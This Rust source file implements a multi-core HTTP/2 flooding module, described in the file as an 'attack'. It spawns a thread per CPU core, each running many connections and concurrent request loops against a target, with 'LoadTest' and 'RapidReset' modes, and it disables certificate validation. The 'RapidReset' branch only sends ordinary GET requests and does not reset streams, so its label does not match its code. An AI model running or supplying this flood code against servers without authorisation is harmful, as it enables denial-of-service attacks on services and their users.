//! Universal Auto-Adaptive HTTP/2 Attack Module
//!
//! Architecture:
//! - Spawn 1 OS thread per CPU core — true parallelism, no scheduler contention
//! - Each thread: own tokio current-thread runtime + own reqwest client + own connection pool
//! - Each client: N connections per host, each HTTP/2 multiplexed
//! - Each connection: M concurrent async tasks hammering requests
//!
//! Result: cores × connections × streams concurrent requests with zero contention

use std::sync::Arc;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::time::{Duration, Instant};

use reqwest::Client;
use tracing::info;

use phoenix_metrics::AttackMetrics;
use crate::{Attack, AttackContext, AttackError, AttackResult};

#[derive(Debug, Clone, PartialEq)]
pub enum UniversalMode { LoadTest, RapidReset }

pub struct UniversalAttack {
    pub mode:        UniversalMode,
    pub connections: usize,  // connections per thread
    pub duration:    Duration,
    pub rps:         Option<u32>,
}

impl UniversalAttack {
    pub fn load_test()   -> Self { Self { mode: UniversalMode::LoadTest,   connections: 50, duration: Duration::from_secs(30), rps: None } }
    pub fn rapid_reset() -> Self { Self { mode: UniversalMode::RapidReset, connections: 50, duration: Duration::from_secs(30), rps: None } }
    pub fn with_connections(mut self, n: usize)  -> Self { self.connections = n; self }
    pub fn with_duration(mut self, d: Duration)  -> Self { self.duration    = d; self }
    pub fn with_rps(mut self, r: u32)            -> Self { self.rps         = Some(r); self }
}

#[async_trait::async_trait]
impl Attack for UniversalAttack {
    fn name(&self) -> &str { "universal" }
    fn description(&self) -> &str {
        "Multi-core HTTP/2 attack: 1 thread/core × N connections × M tasks"
    }

    async fn run(&self, ctx: AttackContext) -> Result<AttackResult, AttackError> {
        let target           = ctx.target.clone();
        let duration         = self.duration;
        let conns_per_thread = self.connections.max(1);
        let metrics          = ctx.metrics.clone();
        let mode             = self.mode.clone();
        let n_cores          = num_cpus::get();

        // Tasks per connection — how many concurrent async loops per h2 connection
        let tasks_per_conn: usize = 20;

        info!(
            "Launching: {} cores × {} conns × {} tasks = {} concurrent",
            n_cores, conns_per_thread, tasks_per_conn,
            n_cores * conns_per_thread * tasks_per_conn
        );

        let ok_total  = Arc::new(AtomicU64::new(0));
        let err_total = Arc::new(AtomicU64::new(0));
        let stop      = Arc::new(AtomicBool::new(false));
        let start     = Instant::now();

        // Spawn one OS thread per core — each has its own tokio runtime + client
        let mut thread_handles = Vec::with_capacity(n_cores);

        for _core in 0..n_cores {
            let target      = target.clone();
            let ok_c        = ok_total.clone();
            let err_c       = err_total.clone();
            let stop_c      = stop.clone();
            let metrics_c   = metrics.clone();
            let mode        = mode.clone();

            let handle = std::thread::spawn(move || {
                let rt = tokio::runtime::Builder::new_current_thread()
                    .enable_all()
                    .build()
                    .expect("tokio rt");

                rt.block_on(async move {
                    // Each thread: own client with its own connection pool
                    let client = match Client::builder()
                        .http2_prior_knowledge()
                        .danger_accept_invalid_certs(true)
                        .http2_initial_stream_window_size(1u32 << 21)
                        .http2_initial_connection_window_size(1u32 << 24)
                        .http2_adaptive_window(true)
                        .tcp_nodelay(true)
                        .timeout(Duration::from_secs(5))
                        .pool_max_idle_per_host(conns_per_thread * 2)
                        .pool_idle_timeout(Duration::from_secs(60))
                        .build()
                    {
                        Ok(c) => Arc::new(c),
                        Err(_) => return,
                    };

                    // Warm up connections
                    let _ = client.get(&target).send().await;

                    let mut tasks = Vec::new();

                    // Spawn conns_per_thread × tasks_per_conn async loops
                    for _ in 0..conns_per_thread * tasks_per_conn {
                        let client  = client.clone();
                        let target  = target.clone();
                        let ok_c    = ok_c.clone();
                        let err_c   = err_c.clone();
                        let stop_c  = stop_c.clone();
                        let metrics = metrics_c.clone();
                        let mode    = mode.clone();

                        tasks.push(tokio::spawn(async move {
                            while !stop_c.load(Ordering::Relaxed) {
                                match mode {
                                    UniversalMode::LoadTest => {
                                        let t0 = Instant::now();
                                        match client.get(&target).send().await {
                                            Ok(resp) => {
                                                let ok = resp.status().as_u16() < 400;
                                                let _ = resp.bytes().await;
                                                let lat = t0.elapsed().as_micros() as u64;
                                                metrics.record_request(lat, ok, 0).await;
                                                if ok { ok_c.fetch_add(1, Ordering::Relaxed); }
                                                else  { err_c.fetch_add(1, Ordering::Relaxed); }
                                            }
                                            Err(_) => { err_c.fetch_add(1, Ordering::Relaxed); }
                                        }
                                    }
                                    UniversalMode::RapidReset => {
                                        match client.get(&target).send().await {
                                            Ok(_) => {
                                                metrics.record_request(0, true, 0).await;
                                                ok_c.fetch_add(1, Ordering::Relaxed);
                                            }
                                            Err(_) => { err_c.fetch_add(1, Ordering::Relaxed); }
                                        }
                                    }
                                }
                            }
                        }));
                    }

                    // Wait for duration then signal stop
                    tokio::time::sleep(duration).await;
                    stop_c.store(true, Ordering::Relaxed);

                    for t in tasks { t.abort(); }
                });
            });

            thread_handles.push(handle);
        }

        // Wait for all threads to finish
        for h in thread_handles {
            let _ = h.join();
        }

        let elapsed = start.elapsed();
        let ok      = ok_total.load(Ordering::Relaxed);
        let err     = err_total.load(Ordering::Relaxed);
        let total   = ok + err;
        let rps     = total as f64 / elapsed.as_secs_f64();

        info!("Done: {} ok / {} err in {:.1}s = {:.0} rps", ok, err, elapsed.as_secs_f64(), rps);

        let snapshot = metrics.snapshot().await;
        Ok(AttackResult {
            success:        err == 0,
            total_requests: total,
            errors:         err,
            duration:       elapsed,
            snapshot,
        })
    }
}
